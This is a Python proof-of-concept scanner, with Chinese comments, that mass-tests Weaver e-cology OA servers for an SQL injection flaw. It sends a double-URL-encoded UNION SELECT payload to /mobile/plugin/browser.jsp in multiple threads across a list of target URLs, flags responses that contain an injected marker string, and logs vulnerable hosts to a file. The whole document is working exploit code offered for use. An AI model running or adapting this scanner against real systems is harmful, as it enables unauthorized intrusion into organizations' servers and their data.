import requests
from optparse import OptionParser
from queue import Queue
import threading

# 存储结果的队列
result_queue = Queue()

# 请求头
headers={
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
}

#代理
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

#参数列表
def get_args():
    usage='%prog -u <target_url> -f <filename> -t <thread>'
    parser=OptionParser(usage=usage)
    parser.add_option('-u','--url',dest='url',help='指定目标url')
    parser.add_option('-f','--file',dest='file',help='指定URL文件')
    parser.add_option('-t','--thread',dest='thread',help='指定线程数,默认50')
    options,args=parser.parse_args()
    return options


class MyThread(threading.Thread):

    def __init__(self, func, args):
        threading.Thread.__init__(self)
        self.func = func
        self.args = args

    def run(self):
        self.func(self.args[0])


# 调用func函数
# 因为这里的func函数其实是下一步将要编写的线程函数

#poc
def poc(target):
    pool_sema.acquire()
    requests.packages.urllib3.disable_warnings()
    target=target.strip('/')
    target1 = target
    target=target+'/mobile/plugin/browser.jsp'
    session=requests.Session()
    post_data={
        'isDis':1,
        'browserTypeId':269,
        'keyword':'%25%36%31%25%32%35%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%37%25%36%35%25%36%33%25%36%66%25%36%63%25%36%66%25%36%37%25%37%39%25%32%64%25%37%33%25%37%31%25%36%63%25%36%39%25%36%35%25%36%34%25%32%37%25%32%39%25%32%37'
    }
    try:
        res=session.post(target,data=post_data,headers=headers,verify=False,proxies=proxies,timeout=10)
        if res.status_code == 200 and 'ecology-sqlied' in res.text:
            result_queue.put((target1,"存在漏洞！"))
            pool_sema.release()
        elif res.status_code == 404:
            result_queue.put((target1,'可能存在漏洞，可以试试能不能绕过！'))
            pool_sema.release()
        else:
            pass
            pool_sema.release()
    except:
        pass
        pool_sema.release()


if __name__=='__main__':
    args = get_args()
    url = args.url
    file_path = args.file
    num_threads = 50
    if args.thread:
        num_threads = int(args.thread)
    if url is not None and file_path is None:
        poc(url)
    elif url is None and file_path is not None:
        urls = [x.strip() for x in open(file_path, "r").readlines()]
        pool_sema = threading.BoundedSemaphore(num_threads)
        thread_list = []
        for url in urls:
            m = MyThread(poc, (url,))
            thread_list.append(m)
        for mt in thread_list:
            mt.start()
        for mt in thread_list:
            mt.join()
    f = open('vuln.txt', 'a+')
    while not result_queue.empty():
        url, status_code = result_queue.get()
        print('{} - {}'.format(url, status_code))
        f.write(url+'\n')
    f.close()
